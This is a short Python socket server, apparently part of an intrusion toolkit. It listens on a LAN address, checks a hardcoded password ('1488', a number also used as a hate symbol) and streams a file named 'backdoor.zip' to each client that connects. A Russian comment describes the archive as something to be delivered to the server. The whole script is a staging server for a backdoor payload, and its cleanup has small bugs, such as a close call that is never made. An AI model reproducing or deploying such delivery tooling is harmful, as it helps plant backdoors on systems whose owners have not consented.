import socket               # Import socket module
import datetime


def main():
    s = socket.socket()         # Create a socket object
    password = b"1488"      # Пароль для проверки клиента
    host = '192.168.3.2'    # Get local machine name
    port = 12345                 # Reserve a port for your service.
    s.bind((host, port))        # Bind to the port

    s.listen(5)  # Now wait for client connection.
    while True:
        c, addr = s.accept()    # Establish connection with client.
        print(f"Got connection from {addr}, \nTime: {datetime.datetime.now()}\n")

        resved_pass = c.recv(1024)
        if resved_pass != password:
            print("Wrong password! Disconnecting...\n")
            c.close()
            continue
        else:
            print(f"Successful connection from: {addr}, \nTime: {datetime.datetime.now()}\n")

        f = open('backdoor.zip', 'rb')    # Названия архива, который нужно доставить на сервер

        print("Starting sending file...")
        l = f.read(1024)
        try:
            while (l):
                c.send(l)
                l = f.read(1024)
        except:
            print("except")
        f.close()
        c.shutdown(socket.SHUT_WR)

        print("Done Sending.", "Time:", datetime.datetime.now())
        c.close

if __name__ == '__main__':
    main()

